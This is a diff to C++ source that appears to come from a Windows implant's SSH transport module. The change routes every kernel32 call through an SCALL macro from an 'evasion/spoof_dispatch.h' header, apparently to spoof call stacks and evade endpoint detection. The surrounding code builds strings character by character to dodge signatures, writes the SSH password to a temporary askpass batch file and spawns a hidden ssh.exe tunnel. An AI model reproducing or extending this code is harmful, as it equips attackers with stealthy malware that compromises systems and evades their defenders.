@@ -4,6 +4,7 @@
 #include <base64.h>
 #include <crypto.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #if defined( SSH_TRANSPORT )
 
@@ -22,13 +23,13 @@ static auto declfn ssh_spawn_process( instance& inst ) -> bool {
     HANDLE h_stdout_read  = NULL;
     HANDLE h_stdout_write = NULL;
 
-    if ( !inst.kernel32.CreatePipe( &h_stdin_read, &h_stdin_write, &sa, 0 ) )
+    if ( !SCALL( inst, kernel32.CreatePipe, &h_stdin_read, &h_stdin_write, &sa, 0 ) )
         return false;
-    if ( !inst.kernel32.CreatePipe( &h_stdout_read, &h_stdout_write, &sa, 0 ) )
+    if ( !SCALL( inst, kernel32.CreatePipe, &h_stdout_read, &h_stdout_write, &sa, 0 ) )
         return false;
 
-    inst.kernel32.SetHandleInformation( h_stdin_write, HANDLE_FLAG_INHERIT, 0 );
-    inst.kernel32.SetHandleInformation( h_stdout_read, HANDLE_FLAG_INHERIT, 0 );
+    SCALL( inst, kernel32.SetHandleInformation, h_stdin_write, HANDLE_FLAG_INHERIT, 0 );
+    SCALL( inst, kernel32.SetHandleInformation, h_stdout_read, HANDLE_FLAG_INHERIT, 0 );
 
     char cmdline[1024] = {};
     char ssh_path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','O','p','e','n','S','S','H','\\','s','s','h','.','e','x','e', 0 };
@@ -57,7 +58,7 @@ static auto declfn ssh_spawn_process( instance& inst ) -> bool {
     // SSH_ASKPASS script for password auth
     char askpass_path[MAX_PATH] = {};
     char temp_dir[MAX_PATH] = {};
-    inst.kernel32.GetTempPathA( MAX_PATH, temp_dir );
+    SCALL( inst, kernel32.GetTempPathA, MAX_PATH, temp_dir );
 
     char askpass_name[] = { 's','b','_','a','p','.','c','m','d', 0 };
     char* dp = askpass_path;
@@ -67,17 +68,17 @@ static auto declfn ssh_spawn_process( instance& inst ) -> bool {
     while ( *sp ) *dp++ = *sp++;
     *dp = 0;
 
-    HANDLE h_askpass = inst.kernel32.CreateFileA(
+    HANDLE h_askpass = (HANDLE)SCALL( inst, kernel32.CreateFileA,
         askpass_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
     );
     if ( h_askpass != INVALID_HANDLE_VALUE ) {
         char prefix[] = { '@','e','c','h','o',' ','o','f','f','\r','\n','e','c','h','o',' ', 0 };
         DWORD written;
-        inst.kernel32.WriteFile( h_askpass, prefix, 16, &written, NULL );
+        SCALL( inst, kernel32.WriteFile, h_askpass, prefix, 16, &written, NULL );
         uint32_t pw_len = 0;
         while ( inst.transport.ssh_password[pw_len] ) pw_len++;
-        inst.kernel32.WriteFile( h_askpass, inst.transport.ssh_password, pw_len, &written, NULL );
-        inst.kernel32.CloseHandle( h_askpass );
+        SCALL( inst, kernel32.WriteFile, h_askpass, inst.transport.ssh_password, pw_len, &written, NULL );
+        SCALL( inst, kernel32.CloseHandle, h_askpass );
     }
 
     char env_askpass[] = { 'S','S','H','_','A','S','K','P','A','S','S', 0 };
@@ -86,9 +87,9 @@ static auto declfn ssh_spawn_process( instance& inst ) -> bool {
     char val_force[]   = { 'f','o','r','c','e', 0 };
     char val_display[] = { 'l','o','c','a','l','h','o','s','t',':','0', 0 };
 
-    inst.kernel32.SetEnvironmentVariableA( env_askpass, askpass_path );
-    inst.kernel32.SetEnvironmentVariableA( env_require, val_force );
-    inst.kernel32.SetEnvironmentVariableA( env_display, val_display );
+    SCALL( inst, kernel32.SetEnvironmentVariableA, env_askpass, askpass_path );
+    SCALL( inst, kernel32.SetEnvironmentVariableA, env_require, val_force );
+    SCALL( inst, kernel32.SetEnvironmentVariableA, env_display, val_display );
 
     STARTUPINFOA si = {};
     si.cb = sizeof( STARTUPINFOA );
@@ -100,7 +101,7 @@ static auto declfn ssh_spawn_process( instance& inst ) -> bool {
 
     PROCESS_INFORMATION pi_info = {};
 
-    BOOL created = inst.kernel32.CreateProcessA(
+    BOOL created = (BOOL)SCALL( inst, kernel32.CreateProcessA,
         NULL,
         cmdline,
         NULL, NULL,
@@ -111,17 +112,17 @@ static auto declfn ssh_spawn_process( instance& inst ) -> bool {
         &pi_info
     );
 
-    inst.kernel32.SetEnvironmentVariableA( env_askpass, NULL );
-    inst.kernel32.SetEnvironmentVariableA( env_require, NULL );
-    inst.kernel32.SetEnvironmentVariableA( env_display, NULL );
+    SCALL( inst, kernel32.SetEnvironmentVariableA, env_askpass, NULL );
+    SCALL( inst, kernel32.SetEnvironmentVariableA, env_require, NULL );
+    SCALL( inst, kernel32.SetEnvironmentVariableA, env_display, NULL );
 
-    inst.kernel32.CloseHandle( h_stdin_read );
-    inst.kernel32.CloseHandle( h_stdout_write );
+    SCALL( inst, kernel32.CloseHandle, h_stdin_read );
+    SCALL( inst, kernel32.CloseHandle, h_stdout_write );
 
     if ( !created ) {
-        inst.kernel32.CloseHandle( h_stdin_write );
-        inst.kernel32.CloseHandle( h_stdout_read );
-        inst.kernel32.DeleteFileA( askpass_path );
+        SCALL( inst, kernel32.CloseHandle, h_stdin_write );
+        SCALL( inst, kernel32.CloseHandle, h_stdout_read );
+        SCALL( inst, kernel32.DeleteFileA, askpass_path );
         return false;
     }
 
@@ -135,7 +136,7 @@ static auto declfn ssh_spawn_process( instance& inst ) -> bool {
         inst.ssh.askpass_path[i] = askpass_path[i];
 
     SleepMs( 2000 );
-    inst.kernel32.DeleteFileA( askpass_path );
+    SCALL( inst, kernel32.DeleteFileA, askpass_path );
 
     return true;
 }
@@ -143,7 +144,7 @@ static auto declfn ssh_spawn_process( instance& inst ) -> bool {
 static auto declfn ssh_is_alive( instance& inst ) -> bool {
     if ( !inst.ssh.h_process ) return false;
     DWORD exit_code = 0;
-    inst.kernel32.GetExitCodeProcess( inst.ssh.h_process, &exit_code );
+    SCALL( inst, kernel32.GetExitCodeProcess, inst.ssh.h_process, &exit_code );
     return exit_code == STILL_ACTIVE;
 }
 
@@ -151,7 +152,7 @@ static auto declfn ssh_write_pipe( instance& inst, const uint8_t* data, uint32_t
     DWORD written = 0;
     DWORD total = 0;
     while ( total < len ) {
-        if ( !inst.kernel32.WriteFile( inst.ssh.h_stdin, data + total, len - total, &written, NULL ) )
+        if ( !SCALL( inst, kernel32.WriteFile, inst.ssh.h_stdin, data + total, len - total, &written, NULL ) )
             return false;
         total += written;
     }
@@ -160,22 +161,22 @@ static auto declfn ssh_write_pipe( instance& inst, const uint8_t* data, uint32_t
 
 static auto declfn ssh_read_pipe( instance& inst, uint8_t* buf, uint32_t len, uint32_t timeout_ms ) -> bool {
     DWORD total = 0;
-    DWORD start = inst.kernel32.GetTickCount();
+    DWORD start = (DWORD)SCALL( inst, kernel32.GetTickCount );
 
     while ( total < len ) {
         DWORD available = 0;
-        if ( !inst.kernel32.PeekNamedPipe( inst.ssh.h_stdout, NULL, 0, NULL, &available, NULL ) )
+        if ( !SCALL( inst, kernel32.PeekNamedPipe, inst.ssh.h_stdout, NULL, 0, NULL, &available, NULL ) )
             return false;
 
         if ( available > 0 ) {
             DWORD to_read = len - total;
             if ( to_read > available ) to_read = available;
             DWORD read_bytes = 0;
-            if ( !inst.kernel32.ReadFile( inst.ssh.h_stdout, buf + total, to_read, &read_bytes, NULL ) )
+            if ( !SCALL( inst, kernel32.ReadFile, inst.ssh.h_stdout, buf + total, to_read, &read_bytes, NULL ) )
                 return false;
             total += read_bytes;
         } else {
-            if ( (inst.kernel32.GetTickCount() - start) > timeout_ms )
+            if ( ((DWORD)SCALL( inst, kernel32.GetTickCount ) - start) > timeout_ms )
                 return false;
             SleepMs( 50 );
         }
@@ -318,24 +319,24 @@ fail:
 
 auto declfn ssh_destroy( instance& inst ) -> void {
     if ( inst.ssh.h_stdin ) {
-        inst.kernel32.CloseHandle( inst.ssh.h_stdin );
+        SCALL( inst, kernel32.CloseHandle, inst.ssh.h_stdin );
         inst.ssh.h_stdin = NULL;
     }
     if ( inst.ssh.h_stdout ) {
-        inst.kernel32.CloseHandle( inst.ssh.h_stdout );
+        SCALL( inst, kernel32.CloseHandle, inst.ssh.h_stdout );
         inst.ssh.h_stdout = NULL;
     }
     if ( inst.ssh.h_process ) {
-        inst.kernel32.TerminateProcess( inst.ssh.h_process, 0 );
-        inst.kernel32.CloseHandle( inst.ssh.h_process );
+        SCALL( inst, kernel32.TerminateProcess, inst.ssh.h_process, 0 );
+        SCALL( inst, kernel32.CloseHandle, inst.ssh.h_process );
         inst.ssh.h_process = NULL;
     }
     if ( inst.ssh.h_thread ) {
-        inst.kernel32.CloseHandle( inst.ssh.h_thread );
+        SCALL( inst, kernel32.CloseHandle, inst.ssh.h_thread );
         inst.ssh.h_thread = NULL;
     }
     if ( inst.ssh.askpass_path[0] ) {
-        inst.kernel32.DeleteFileA( inst.ssh.askpass_path );
+        SCALL( inst, kernel32.DeleteFileA, inst.ssh.askpass_path );
         inst.ssh.askpass_path[0] = 0;
     }
     inst.ssh.connected = false;
